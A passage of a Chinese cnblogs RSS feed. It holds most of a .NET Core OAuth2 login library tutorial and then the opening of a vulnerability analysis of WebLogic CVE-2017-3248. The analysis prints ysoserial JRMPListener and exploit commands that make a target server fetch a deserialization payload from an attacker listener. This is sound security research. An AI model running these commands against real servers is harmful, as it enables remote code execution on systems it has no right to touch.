      &quot;scope&quot;: &quot;repo&quot;
    }
  }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里的配置可以通过 &lt;code&gt;https://github.com/settings/applications/new&lt;/code&gt; 来注册，&lt;code&gt;redirect_uri&lt;/code&gt; 可以填写本地 &lt;code&gt;localhost&lt;/code&gt; 地址的，超级方便，这也是为什么使用 &lt;code&gt;github&lt;/code&gt; 登录做演示的原因。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://imgkr2.cn-bj.ufileos.com/d7665d12-547e-422e-9fed-fa5ca463867c.png?UCloudPublicKey=TOKEN_8d8b72be-579a-4e83-bfd0-5f6ce1546f13&amp;amp;Signature=2q%252Bo8vy5oy%252Foqne5OWIbxpuNH9E%253D&amp;amp;Expires=1610653563&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;创建完成后，在这个界面里生成 &lt;code&gt;client secret&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://static01.imgkr.com/temp/db287e3a14684ff2ba33293ed9104707.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;输入密码，生成成功后是这样的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://imgkr2.cn-bj.ufileos.com/2af60b6d-efc8-410b-a688-6cf125208d75.png?UCloudPublicKey=TOKEN_8d8b72be-579a-4e83-bfd0-5f6ce1546f13&amp;amp;Signature=NsSqfI6jmhWTej0AjQg7q%252FXJ7h8%253D&amp;amp;Expires=1610653750&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;把界面里的 &lt;code&gt;Client ID&lt;/code&gt;，&lt;code&gt;Client secret&lt;/code&gt;，连同上一个界面里填写的 &lt;code&gt;Authorization callback URL&lt;/code&gt; 全部填写到配置文件对应位置。现在配置文件 &lt;code&gt;appsettings.json&lt;/code&gt; 是这样的：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-json&quot;&gt;{
  &quot;Logging&quot;: {
    &quot;LogLevel&quot;: {
      &quot;Default&quot;: &quot;Information&quot;,
      &quot;Microsoft&quot;: &quot;Warning&quot;,
      &quot;Microsoft.Hosting.Lifetime&quot;: &quot;Information&quot;
    }
  },
  &quot;AllowedHosts&quot;: &quot;*&quot;,
  &quot;oauth&quot;: {
    &quot;github&quot;: {
      &quot;app_id&quot;: &quot;c95fxxxxxx0d09&quot;,
      &quot;app_key&quot;: &quot;c6a73xxxxxx6375&quot;,
      &quot;redirect_uri&quot;: &quot;http://localhost:5000/oauth/githubcallback&quot;,
      &quot;scope&quot;: &quot;repo&quot;
    }
  }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;下面的 &lt;code&gt;scope&lt;/code&gt; 暂且不管他，你想深入了解它的作用的话，后面再说。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;第三步：写代码&quot;&gt;第三步：写代码&lt;/h4&gt;
&lt;p&gt;在 &lt;code&gt;Startup.cs&lt;/code&gt; 文件中注入组件：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;// This method gets called by the runtime. Use this method to add services to the container.
public void ConfigureServices(IServiceCollection services)
{
    services.AddControllersWithViews();
    services.AddSingleton(new GithubOAuth(OAuthConfig.LoadFrom(Configuration, &quot;oauth:github&quot;)));
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;文件中其他代码没有修改，只加了这一行而已。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;新建一个 &lt;code&gt;OAuthController&lt;/code&gt; 类，代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using MrHuo.OAuth.Github;
namespace GithubLogin.Controllers
{
    public class OAuthController: Controller
    {
        [HttpGet(&quot;oauth/github&quot;)]
        public IActionResult Github([FromServices] GithubOAuth githubOAuth)
        {
            return Redirect(githubOAuth.GetAuthorizeUrl());
        }
        [HttpGet(&quot;oauth/githubcallback&quot;)]
        public async Task&amp;lt;IActionResult&amp;gt; GithubCallback(
            [FromServices] GithubOAuth githubOAuth,
            [FromQuery] string code)
        {
            return Json(await githubOAuth.AuthorizeCallback(code));
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;你没看错，就这点代码就好了。我们来运行一下试试：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://static01.imgkr.com/temp/45685018a07245c8a7f7896e35a30c12.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;项目运行之后，在地址栏里输入下面这个地址：&lt;code&gt;http://localhost:5000/oauth/github&lt;/code&gt;，因为我们没有修改任何代码，没有在视图上做任何链接，所以就劳烦手动啦~~&lt;/p&gt;
&lt;p&gt;回车之后，顺利跳转到 &lt;code&gt;github&lt;/code&gt; 授权：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://static01.imgkr.com/temp/0076b15cc30744b1b9ebf173fb981983.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;点击绿色的 &lt;code&gt;Authorize&lt;/code&gt; 按钮之后稍等片刻，你会看到下面这个结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://static01.imgkr.com/temp/8b51c0cffba548daaa973ac7ab5f2a6f.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;顺利拿到了用户信息（PS:请忽略我少的可怜的粉丝，曾经我不强求 --ToT）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://imgkr2.cn-bj.ufileos.com/0c7d8ecd-1633-48a1-8b38-284345a8c7b0.png?UCloudPublicKey=TOKEN_8d8b72be-579a-4e83-bfd0-5f6ce1546f13&amp;amp;Signature=gwfLQKYQqmoSnmX%252BKTZlDl3U%252FwU%253D&amp;amp;Expires=1610655014&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;好了，到这里我的表演结束了，可以看到接入流程非常流程，卡人主要是在申请这些步骤。下面讲讲原理之类的，随便说一些...如果觉得我啰嗦，那么就不用往下看了，因为下面我会更啰嗦。&lt;/p&gt;
&lt;p&gt;当然，除了 &lt;code&gt;github&lt;/code&gt; 现在已经接入了12个平台，其中 &lt;code&gt;QQ&lt;/code&gt; 和抖音我没有注册到应用，无法测试，所以暂时没有 &lt;code&gt;nuget&lt;/code&gt; 包，一个人的力量总是有限的，在这里我请求各位有闲时间或者有 &lt;code&gt;appid&lt;/code&gt; 资源的大佬，为这个小项目做一些贡献，是她走的远一些。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://static01.imgkr.com/temp/71e4771961ed42828f0f21ecb46cfb46.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;更多的 &lt;code&gt;nuget&lt;/code&gt; 包，进这里 &lt;code&gt;https://www.nuget.org/profiles/mrhuo&lt;/code&gt; 或者在 VS nuget 包管理器里搜索 &lt;code&gt;MrHuo.OAuth&lt;/code&gt;，就可以了。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;请忽略 &lt;code&gt;nuget&lt;/code&gt; 上其他几个 &lt;code&gt;垃圾&lt;/code&gt; 包，那是很多年很多年以前写的，舍不得删。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;开发背景&quot;&gt;开发背景&lt;/h2&gt;
&lt;p&gt;第三方平台登录说白了就是实现 &lt;code&gt;OAuth2&lt;/code&gt; 协议，很多平台比如支付宝、百度、github、微软，甚至是抖音、快手很多平台都提供了开放接口。但是，很多平台会在这个标准协议的基础上增加、修改一些东西，比如：标准协议里，获取 &lt;code&gt;authorize code&lt;/code&gt; 时应提供 &lt;code&gt;client_id&lt;/code&gt;，微信公众平台非要把它改成 &lt;code&gt;appid&lt;/code&gt;。再比如：获取用户信息时，只需要 &lt;code&gt;access_token&lt;/code&gt; 参数，微信公众平台这边非要提供一个 &lt;code&gt;openid&lt;/code&gt;，当然这是在所难免的，因为各个平台实际业务还是千差万别，无法做到完全的统一，那这就给我们开发者带来一个困扰，开发第三方登录时很困难，当然，开发一两个也无所谓，要是多了呢？&lt;/p&gt;
&lt;p&gt;假如有这么一个产品经理，他想接入很多的登录方式，让使用者无论使用哪种平台，都能在这里顺利登录，找到回家的路呢（PS:产品经理你别跑，看我40米的大刀）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://imgkr2.cn-bj.ufileos.com/42deba00-15b6-49d2-afb6-7dcd1fd2c10d.png?UCloudPublicKey=TOKEN_8d8b72be-579a-4e83-bfd0-5f6ce1546f13&amp;amp;Signature=O39mc6vUsoIhHI6VYb6F1GP8hL4%253D&amp;amp;Expires=1610651734&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;无疑，给我们一个考验，如何做到一个标准化，可配置，可扩展呢？这就是一个需要深究的问题。下面我就说说我肝这个项目的一些想法，说的不好别喷我，我还年轻（PS:三十多岁老大叔别装嫩），还要脸......&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://static01.imgkr.com/temp/e3e1d08ef5234246806c3b01cb568297.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;制定标准&quot;&gt;制定标准&lt;/h2&gt;
&lt;p&gt;看了很多文档之后，我们会发现，万变不离其宗，总有规律可循，总的来说，有下面3个步骤：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;code&gt;GetAuthorizeUrl&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;这一步通过 &lt;code&gt;client_id&lt;/code&gt;，&lt;code&gt;redirect_uri&lt;/code&gt; 等几个参数来获取授权 &lt;code&gt;url&lt;/code&gt;，跳转到这个 &lt;code&gt;url&lt;/code&gt; 之后将在第三方平台上完成登录，完成登录之后会跳转到上面提供的 &lt;code&gt;redirect_uri&lt;/code&gt; 这个地址，并且带上一个 &lt;code&gt;code&lt;/code&gt; 参数。&lt;/p&gt;
&lt;ol start=&quot;2&quot;&gt;&lt;li&gt;&lt;code&gt;GetAccessToken&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;这一步里，拿到上面的 &lt;code&gt;code&lt;/code&gt; 之后去第三方平台换 &lt;code&gt;access_token&lt;/code&gt;。&lt;/p&gt;
&lt;ol start=&quot;3&quot;&gt;&lt;li&gt;&lt;code&gt;GetUserInfo&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;这一步并非必须，但是我们既然是做第三方登录，登录之后还是需要和自己平台的一些业务绑定用户账号，或者使用现有信息注册一个用户，这个方法就显得尤为重要了。&lt;/p&gt;
&lt;p&gt;到此，就这3个步骤，我觉得时需要制定在标准里面的，所以我就写了下面这个接口来规范它：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;/// &amp;lt;summary&amp;gt;
/// OAuth 登录 API 接口规范
/// &amp;lt;/summary&amp;gt;
public interface IOAuthLoginApi&amp;lt;TAccessTokenModel, TUserInfoModel&amp;gt;
    where TAccessTokenModel : IAccessTokenModel
    where TUserInfoModel : IUserInfoModel
{
    /// &amp;lt;summary&amp;gt;
    /// 获取跳转授权的 URL
    /// &amp;lt;/summary&amp;gt;
    /// &amp;lt;param name=&quot;state&quot;&amp;gt;&amp;lt;/param&amp;gt;
    /// &amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;
    string GetAuthorizeUrl(string state = &quot;&quot;);

    /// &amp;lt;summary&amp;gt;
    /// 异步获取 AccessToken
    /// &amp;lt;/summary&amp;gt;
    /// &amp;lt;param name=&quot;code&quot;&amp;gt;&amp;lt;/param&amp;gt;
    /// &amp;lt;param name=&quot;state&quot;&amp;gt;&amp;lt;/param&amp;gt;
    /// &amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;
    Task&amp;lt;TAccessTokenModel&amp;gt; GetAccessTokenAsync(string code, string state = &quot;&quot;);

    /// &amp;lt;summary&amp;gt;
    /// 异步获取用户详细信息
    /// &amp;lt;/summary&amp;gt;
    /// &amp;lt;param name=&quot;accessTokenModel&quot;&amp;gt;&amp;lt;/param&amp;gt;
    /// &amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;
    Task&amp;lt;TUserInfoModel&amp;gt; GetUserInfoAsync(TAccessTokenModel accessTokenModel);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到我将 &lt;code&gt;AccessToken&lt;/code&gt; 和 &lt;code&gt;UserInfo&lt;/code&gt; 做成了泛型参数，因为他们是这个规范里的可变部分。代码中 &lt;code&gt;state&lt;/code&gt; 参数的作用呢就是为了防止 &lt;code&gt;CORS&lt;/code&gt; 攻击做的防伪验证，这里暂不做解释，其他文档里都有这个参数的解释。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://imgkr2.cn-bj.ufileos.com/80587ef8-5717-4cc7-929f-490eb888523b.png?UCloudPublicKey=TOKEN_8d8b72be-579a-4e83-bfd0-5f6ce1546f13&amp;amp;Signature=SncgXmscoh%252FwLalYAglqIDkfprI%253D&amp;amp;Expires=1610658050&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;如何扩展新的平台&quot;&gt;如何扩展新的平台&lt;/h2&gt;
&lt;p&gt;这里拿 &lt;code&gt;Gitee&lt;/code&gt; 来做演示：&lt;/p&gt;
&lt;h4 id=&quot;第一步：找平台对应-oauth-文档，找到获取用户信息接口返回json，转换为-c-实体类。如下：&quot;&gt;第一步：找平台对应 OAuth 文档，找到获取用户信息接口返回JSON，转换为 C# 实体类。如下：&lt;/h4&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;根据自己需要和接口标准，扩展用户属性&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;public class GiteeUserModel : IUserInfoModel
{
    [JsonPropertyName(&quot;name&quot;)]
    public string Name { get; set; }

    [JsonPropertyName(&quot;avatar_url&quot;)]
    public string Avatar { get; set; }

    [JsonPropertyName(&quot;message&quot;)]
    public string ErrorMessage { get; set; }

    [JsonPropertyName(&quot;email&quot;)]
    public string Email { get; set; }

    [JsonPropertyName(&quot;blog&quot;)]
    public string Blog { get; set; }

    //...其他属性类似如上
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;这里使用了 &lt;code&gt;.netcore&lt;/code&gt; 内置的 &lt;code&gt;Json&lt;/code&gt; 序列化库，据说性能提高了不少！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;第二步：写对应平台的授权接口&quot;&gt;第二步：写对应平台的授权接口&lt;/h4&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;/// &amp;lt;summary&amp;gt;
/// https://gitee.com/api/v5/oauth_doc#/
/// &amp;lt;/summary&amp;gt;
public class GiteeOAuth : OAuthLoginBase&amp;lt;GiteeUserModel&amp;gt;
{
    public GiteeOAuth(OAuthConfig oauthConfig) : base(oauthConfig) { }
    protected override string AuthorizeUrl =&amp;gt; &quot;https://gitee.com/oauth/authorize&quot;;
    protected override string AccessTokenUrl =&amp;gt; &quot;https://gitee.com/oauth/token&quot;;
    protected override string UserInfoUrl =&amp;gt; &quot;https://gitee.com/api/v5/user&quot;;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;加上注释，总共十行，如你所见，非常方便。如果该平台协议遵循 OAuth2 标准开发，那么就这么几行就好了。&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;当然，如果不按规矩自定义字段的平台，也可以扩展，比如微信公众平台。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;WechatAccessTokenModel.cs&lt;/code&gt; AccessToken 类扩展&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;namespace MrHuo.OAuth.Wechat
{
    public class WechatAccessTokenModel : DefaultAccessTokenModel
    {
        [JsonPropertyName(&quot;openid&quot;)]
        public string OpenId { get; set; }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;继承自 &lt;code&gt;DefaultAccessTokenModel&lt;/code&gt;，新增字段 &lt;code&gt;OpenId&lt;/code&gt;，因为获取用户信息需要获取 &lt;code&gt;OpenId&lt;/code&gt;，所以这里需要它。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;WechatUserInfoModel.cs&lt;/code&gt; 用户信息类&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;using System.Collections.Generic;
using System.Text.Json.Serialization;

namespace MrHuo.OAuth.Wechat
{
    public class WechatUserInfoModel : IUserInfoModel
    {
        [JsonPropertyName(&quot;nickname&quot;)]
        public string Name { get; set; }

        [JsonPropertyName(&quot;headimgurl&quot;)]
        public string Avatar { get; set; }

        [JsonPropertyName(&quot;language&quot;)]
        public string Language { get; set; }

        [JsonPropertyName(&quot;openid&quot;)]
        public string Openid { get; set; }

        [JsonPropertyName(&quot;sex&quot;)]
        public int Sex { get; set; }

        [JsonPropertyName(&quot;province&quot;)]
        public string Province { get; set; }

        [JsonPropertyName(&quot;city&quot;)]
        public string City { get; set; }

        [JsonPropertyName(&quot;country&quot;)]
        public string Country { get; set; }

        /// &amp;lt;summary&amp;gt;
        /// 用户特权信息，json 数组，如微信沃卡用户为（chinaunicom）
        /// &amp;lt;/summary&amp;gt;
        [JsonPropertyName(&quot;privilege&quot;)]
        public List&amp;lt;string&amp;gt; Privilege { get; set; }

        [JsonPropertyName(&quot;unionid&quot;)]
        public string UnionId { get; set; }

        [JsonPropertyName(&quot;errmsg&quot;)]
        public string ErrorMessage { get; set; }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;这里用户信息字段上边的 &lt;code&gt;[JsonPropertyName(&quot;xxxx&quot;)]&lt;/code&gt; 完全按照文档里的字段写，否则获取不到正确的值。如果不需要太多的字段，自行删减。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;WechatOAuth.cs&lt;/code&gt; 核心类&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;using System.Collections.Generic;
namespace MrHuo.OAuth.Wechat
{
    /// &amp;lt;summary&amp;gt;
    /// Wechat OAuth 相关文档参考：
    /// &amp;lt;para&amp;gt;https://developers.weixin.qq.com/doc/offiaccount/OA_Web_Apps/Wechat_webpage_authorization.html&amp;lt;/para&amp;gt;
    /// &amp;lt;/summary&amp;gt;
    public class WechatOAuth : OAuthLoginBase&amp;lt;WechatAccessTokenModel, WechatUserInfoModel&amp;gt;
    {
        public WechatOAuth(OAuthConfig oauthConfig) : base(oauthConfig) { }
        protected override string AuthorizeUrl =&amp;gt; &quot;https://open.weixin.qq.com/connect/oauth2/authorize&quot;;
        protected override string AccessTokenUrl =&amp;gt; &quot;https://api.weixin.qq.com/sns/oauth2/access_token&quot;;
        protected override string UserInfoUrl =&amp;gt; &quot;https://api.weixin.qq.com/sns/userinfo&quot;;
        protected override Dictionary&amp;lt;string, string&amp;gt; BuildAuthorizeParams(string state)
        {
            return new Dictionary&amp;lt;string, string&amp;gt;()
            {
                [&quot;response_type&quot;] = &quot;code&quot;,
                [&quot;appid&quot;] = oauthConfig.AppId,
                [&quot;redirect_uri&quot;] = System.Web.HttpUtility.UrlEncode(oauthConfig.RedirectUri),
                [&quot;scope&quot;] = oauthConfig.Scope,
                [&quot;state&quot;] = state
            };
        }
        public override string GetAuthorizeUrl(string state = &quot;&quot;)
        {
            return $&quot;{base.GetAuthorizeUrl(state)}#wechat_redirect&quot;;
        }
        protected override Dictionary&amp;lt;string, string&amp;gt; BuildGetAccessTokenParams(Dictionary&amp;lt;string, string&amp;gt; authorizeCallbackParams)
        {
            return new Dictionary&amp;lt;string, string&amp;gt;()
            {
                [&quot;grant_type&quot;] = &quot;authorization_code&quot;,
                [&quot;appid&quot;] = $&quot;{oauthConfig.AppId}&quot;,
                [&quot;secret&quot;] = $&quot;{oauthConfig.AppKey}&quot;,
                [&quot;code&quot;] = $&quot;{authorizeCallbackParams[&quot;code&quot;]}&quot;
            };
        }
        protected override Dictionary&amp;lt;string, string&amp;gt; BuildGetUserInfoParams(WechatAccessTokenModel accessTokenModel)
        {
            return new Dictionary&amp;lt;string, string&amp;gt;()
            {
                [&quot;access_token&quot;] = accessTokenModel.AccessToken,
                [&quot;openid&quot;] = accessTokenModel.OpenId,
                [&quot;lang&quot;] = &quot;zh_CN&quot;,
            };
        }
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;乍一看好多内容，懵了？先别懵，我一个一个来说一下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;protected override Dictionary&amp;lt;string, string&amp;gt; BuildAuthorizeParams(string state)
{
    return new Dictionary&amp;lt;string, string&amp;gt;()
    {
        [&quot;response_type&quot;] = &quot;code&quot;,
        [&quot;appid&quot;] = oauthConfig.AppId,
        [&quot;redirect_uri&quot;] = System.Web.HttpUtility.UrlEncode(oauthConfig.RedirectUri),
        [&quot;scope&quot;] = oauthConfig.Scope,
        [&quot;state&quot;] = state
    };
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;细心的读者发现了，这一段就是为了构造 &lt;code&gt;Authorize Url&lt;/code&gt; 时后边的参数列表，返回一个 &lt;code&gt;Dictionary&amp;lt;string, string&amp;gt;&lt;/code&gt; 即可，以为微信公众号把 &lt;code&gt;client_id&lt;/code&gt; 字段修改为 &lt;code&gt;appid&lt;/code&gt;，所以这里需要处理一下。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;public override string GetAuthorizeUrl(string state = &quot;&quot;)
{
    return $&quot;{base.GetAuthorizeUrl(state)}#wechat_redirect&quot;;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这一段，在 &lt;code&gt;Authorize Url&lt;/code&gt; 后边缀了个 &lt;code&gt;#wechat_redirect&lt;/code&gt;，虽然不知道微信在这个参数上做了什么文章（PS:知道的朋友，言传一下~~），但是他文档里写就给他写上吧。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;protected override Dictionary&amp;lt;string, string&amp;gt; BuildGetAccessTokenParams(Dictionary&amp;lt;string, string&amp;gt; authorizeCallbackParams)
{
    return new Dictionary&amp;lt;string, string&amp;gt;()
    {
        [&quot;grant_type&quot;] = &quot;authorization_code&quot;,
        [&quot;appid&quot;] = $&quot;{oauthConfig.AppId}&quot;,
        [&quot;secret&quot;] = $&quot;{oauthConfig.AppKey}&quot;,
        [&quot;code&quot;] = $&quot;{authorizeCallbackParams[&quot;code&quot;]}&quot;
    };
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;同理，这一段是为了构造 &lt;code&gt;GetAccessToken&lt;/code&gt; 接口参数。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-csharp&quot;&gt;protected override Dictionary&amp;lt;string, string&amp;gt; BuildGetUserInfoParams(WechatAccessTokenModel accessTokenModel)
{
    return new Dictionary&amp;lt;string, string&amp;gt;()
    {
        [&quot;access_token&quot;] = accessTokenModel.AccessToken,
        [&quot;openid&quot;] = accessTokenModel.OpenId,
        [&quot;lang&quot;] = &quot;zh_CN&quot;,
    };
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;同理，这一段是为了构造 &lt;code&gt;GetUserInfo&lt;/code&gt; 接口参数。&lt;/p&gt;
&lt;p&gt;可以看到哈，这个框架本者自由、开放的原则，任何能自定义的地方，都可以自定义。还有我原本的出发点，并非只针对 &lt;code&gt;OAuth&lt;/code&gt; 登录这一个方向，我想把他平台里面提供的 &lt;code&gt;API&lt;/code&gt; 全部接入进来，因为扩展太容易了，但是吧，时间精力有限，再说人上了年纪，过了30岁，脑袋就不怎么灵光了，所以机会留给年轻人。&lt;/p&gt;
&lt;h2 id=&quot;加入贡献&quot;&gt;加入贡献&lt;/h2&gt;
&lt;p&gt;我&lt;strong&gt;期待&lt;/strong&gt;更多的朋友能加入到这个项目中，贡献代码也好，贡献 &lt;code&gt;appid&lt;/code&gt; 资源做测试也好，提供意见建议也好。如果你也感兴趣，请联系我。&lt;/p&gt;
&lt;p&gt;如果觉得有用帮到你了，贡献幼儿园之星 ⭐，点个关注，&lt;code&gt;fork&lt;/code&gt; 走一波~~（PS: 手动调皮）&lt;/p&gt;
&lt;h2 id=&quot;相关文档：&quot;&gt;相关文档：&lt;/h2&gt;
&lt;/div&gt;</description>
<pubDate>Wed, 13 Jan 2021 21:50:00 +0000</pubDate>
<dc:creator>开发者精选资讯</dc:creator>
<og:description>此次带来的这个小项目是 OAuth2 登录组件，看到 Java 平台 JustAuth 项目很方便的接入第三方平台登录，心里痒痒啊，搜了一大圈，发现我大 .netcore 能用的可说是少之又少，而且代</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/MrHuo/p/netcore-best-oauth-components.html</dc:identifier>
</item>
<item>
<title>Java 安全之Weblogic 2017-3248分析 - nice_0e3</title>
<link>http://www.cnblogs.com/nice0e3/p/14275298.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/nice0e3/p/14275298.html</guid>
<description>&lt;h2 id=&quot;0x00-前言&quot;&gt;0x00 前言&lt;/h2&gt;
&lt;p&gt;在开头先来谈谈前面的绕过方式，前面的绕过方式分别使用了&lt;code&gt;streamMessageImpl&lt;/code&gt; 和&lt;code&gt;MarshalledObject&lt;/code&gt;对gadgets的对象进行封装起来。其实这本质上算是同一个方式，只是利用了不同的类对他进行封装，达成绕过效果。&lt;/p&gt;
&lt;p&gt;但是在本次的这个绕过方式里面和前面这两个洞的绕过方式截然不同，找到一个未在黑名单之内的新反序列化点，此时可以发送未经处理的gadgets对象，通过JRMP 协议达到执行任意反序列化 payload。而后面的几个绕过方式中基本都是基于这种远程的方式进行绕过。&lt;/p&gt;
&lt;h2 id=&quot;0x01-jrmp概述&quot;&gt;0x01 JRMP概述&lt;/h2&gt;
&lt;p&gt;在这里简单来讲讲JRMP协议相关内容，JRMP是一个Java远程方法协议，该协议基于TCP/IP之上，RMI协议之下。也就是说RMI该协议传递时底层使用的是JRMP协议进行传输。&lt;/p&gt;
&lt;p&gt;RMI默认使用的JRMP进行传递数据，并且JRMP协议只能作用于RMI协议。在这里需要用到ysoserial 的JRMP模块。&lt;/p&gt;
&lt;h2 id=&quot;0x02-漏洞分析&quot;&gt;0x02 漏洞分析&lt;/h2&gt;
&lt;h3 id=&quot;絮絮叨叨&quot;&gt;絮絮叨叨&lt;/h3&gt;
&lt;p&gt;在漏洞利用中需要使用到 ysoserial的 JRMP模块，在这里就先不说该模块功能的构成和分析，在这里需要知道具体的作用与绕过方式，还需要思考为什么这个点能够被绕过。&lt;/p&gt;
&lt;h3 id=&quot;绕过思路：&quot;&gt;绕过思路：&lt;/h3&gt;
&lt;p&gt;前面是使用的类将payload进行封装这种方法在后面的补丁中已经将前面两个用到的补丁给拉入了黑名单，而在该漏洞中使用采用了远程的方式来进行命令执行。我们会在服务器搭建一个JRMPListener服务，然后通过T3协议发送payload，使得weblogic自动请求我们的JRMPListener，而在这时候JRMPListener会返回一个gadgets对象。JRMP基于RMI之下的协议，在传输过程其实传输的序列化数据，在接收完成后会去进行反序列化操作。这么在返回gadgets对象的时候，就会对我们的gadgets对象进行反序列化。达到命令执行的效果。也绕过了黑名单的限制。&lt;/p&gt;
&lt;h3 id=&quot;漏洞复现&quot;&gt;漏洞复现&lt;/h3&gt;
&lt;p&gt;这里先来启动一个JRMPListener,使得weblogic请求我们的JRMPListener返回gadgets对象，在yso工具中其实就已经集成了该功能。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;java -cp .\ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections1 'touch /tmp/2017-3248'
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202101/1993669-20210114035129168-1301026067.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;python cve2017-3248.py 192.168.199.105 7001 ysoserial.jar 192.168.199.234 9999 JRMPClient
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用&lt;code&gt;cve2017-3248.py&lt;/code&gt;exp对目标的weblogic发送payload。其实payload内容也是靠ysoserial的JRMPClient模块生成的gadgets对象。进行反序列化后会进行连接设定好的JRMPListener。&lt;/p&gt;
&lt;p&gt;总体来说该exp只是一个构造T3 协议发送payload的一个作用。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1993669/202101/1993669-20210114035138211-1309610249.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
